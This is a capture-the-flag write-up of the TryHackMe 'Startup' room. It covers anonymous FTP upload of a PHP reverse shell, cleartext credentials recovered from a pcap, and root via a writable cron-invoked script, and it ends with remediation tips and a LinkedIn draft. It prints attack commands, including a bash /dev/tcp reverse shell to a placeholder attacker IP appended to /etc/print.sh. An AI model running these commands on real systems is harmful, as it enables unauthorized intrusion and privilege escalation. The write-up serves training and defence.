---
platform: TryHackMe
title: Startup
os: Linux
difficulty: Easy
tags: Anonymous FTP, PCAP Analysis, Cron PrivEsc
date: 2026-10-14
---

# TryHackMe - Startup (Easy)

**Date:** 2026-10-14  
**Platform:** TryHackMe  
**OS:** Linux  
**Focus Areas:** Web Exploitation, Misconfiguration, Traffic Analysis  

## 1. Executive Summary

The **Startup** machine hosts a public-facing web server alongside an improperly configured FTP service that permits anonymous write access directly into a web-accessible directory. By uploading a PHP reverse shell via anonymous FTP, an initial low-privilege foothold (`www-data`) was established. Subsequent inspection of a captured network trace (`.pcapng`) exposed cleartext user credentials for lateral movement to user `lennie`, followed by root privilege escalation through a world-writable script triggered by a root cron job (`/etc/print.sh`).

## 2. Attack Chain Summary

| Phase | Vector / Technique | Tool / Artifact |
| :--- | :--- | :--- |
| **Reconnaissance** | TCP Port Scanning & Web Directory Busting | `nmap`, `gobuster` |
| **Initial Access** | Anonymous FTP Write Access → Web Root Execution | `ftp` (`vsftpd`), PHP reverse shell |
| **Lateral Movement** | Plaintext credential sniffing in packet capture | `wireshark` / `tshark`, `suspicious.pcapng` |
| **Privilege Escalation** | Writable script executed by root cron job | `bash`, `/etc/print.sh` |

## 3. Walkthrough

### Phase 1: Reconnaissance & Enumeration

- **Port Scanning:** Conducted a service and version scan across default and high ports to identify active attack surfaces.
  ```bash
  nmap -sC -sV -oN nmap_initial.txt <TARGET_IP>
  ```
  - **Port 21 (`vsftpd`):** Anonymous FTP login enabled (`ftp-anon: Anonymous FTP login allowed`).
  - **Port 22 (`OpenSSH`):** Standard SSH service available for authenticated remote access.
  - **Port 80 (`Apache httpd`):** Company landing page ("Spice Hut").
- **Web & FTP Enumeration:** Enumerated hidden web directories using `gobuster` and verified whether the writable `/ftp` directory on Port 21 mapped directly to `/files/ftp/` on Port 80.
  ```bash
  gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
  ftp anonymous@<TARGET_IP>
  ```

### Phase 2: Initial Foothold

- **Vulnerability Identification:** The `ftp/` directory allowed anonymous file uploads and was directly served by the Apache web server with PHP execution enabled.
- **Exploitation:** Uploaded a standard PHP reverse shell (`shell.php`) to `/ftp/`, started a local Netcat listener, and triggered execution via the browser/cURL.
  ```bash
  # Local listener
  nc -lvnp 4444

  # Trigger payload
  curl http://<TARGET_IP>/files/ftp/shell.php
  ```
- **Proof of Foothold:** Upgraded the shell to an interactive PTY and verified user context and the initial recipe flag.
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  whoami && id
  # Output: www-data (uid=33)
  ```

### Phase 3: Lateral Movement & Privilege Escalation

- **Internal Enumeration & PCAP Analysis:** Discovered an `/incidents` directory containing `suspicious.pcapng`. Transferred the capture locally and inspected the TCP stream in Wireshark, uncovering cleartext credentials entered during a previous reverse shell session for user `lennie`.
  ```bash
  su - lennie
  cat ~/user.txt
  ```
- **Privilege Abuse (Root Cron Job):** Inspected `/home/lennie/scripts/planner.sh` (owned by `root`), which called `/etc/print.sh`. Confirmed that `/etc/print.sh` was owned by `lennie` and writable (`-rwx------ 1 lennie lennie`).
  ```bash
  ls -la /home/lennie/scripts/planner.sh /etc/print.sh
  echo "bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1" >> /etc/print.sh
  ```
- **Root Shell & Flags:** Caught the root reverse shell on port `5555` once the 1-minute cron job executed.
  ```bash
  whoami && id
  # Output: root (uid=0)
  cat /root/root.txt
  ```

## 4. Key Takeaways & Real-World Remediation

1. **Disable Anonymous FTP Writes:** Disable `anon_upload_enable` and `anon_mkdir_write_enable` in `/etc/vsftpd.conf`, and never mount public FTP upload directories inside an executable web root.
2. **Strict File Permissions on System Scripts:** Ensure any script invoked by a privileged `root` cron job (`planner.sh` and its child scripts like `/etc/print.sh`) is owned by `root:root` with `chmod 700` or `chmod 755` permissions.
3. **Internal Network Encryption & Credential Hygiene:** Avoid reusing administrative passwords in interactive shells over unencrypted channels, and restrict read access to incident response artifacts (`suspicious.pcapng`) to authorized SOC personnel.

## 5. LinkedIn Post Draft (4-Part Blueprint)

> **Hook:** Just wrapped up the **Startup** room on TryHackMe (Easy / Linux) — a great practical study in how chained misconfigurations turn a low-risk file share into full root compromise.
>
> **The Bottleneck:** Gaining the initial `www-data` foothold via anonymous FTP write access into the web root was straightforward, but pivoting to a standard user required digging into an `/incidents` directory and carving cleartext credentials out of a raw `suspicious.pcapng` network trace in Wireshark. From there, tracing a root-owned cron job (`planner.sh`) revealed a child script (`/etc/print.sh`) left writable by a non-root user.
>
> **The Defensive Angle:**
> • **Decouple Storage from Execution:** Never map anonymous FTP upload directories directly into a web server path where scripts (`.php`) can execute.
> • **Audit Transitive Script Permissions:** Securing a root cron script isn't enough if it calls a secondary script (`chmod` drift) owned by a lower-privileged account.
> • **Protect Incident Artifacts:** Packet captures often contain sensitive session data and credentials; storing `.pcapng` files on a world-readable filesystem creates an easy lateral movement path.
>
> **CTA:** Full technical walkthrough, attack chain table, and remediation notes documented on GitHub: `https://github.com/<your-username>/cybersecurity-writeups/tree/main/tryhackme/startup`
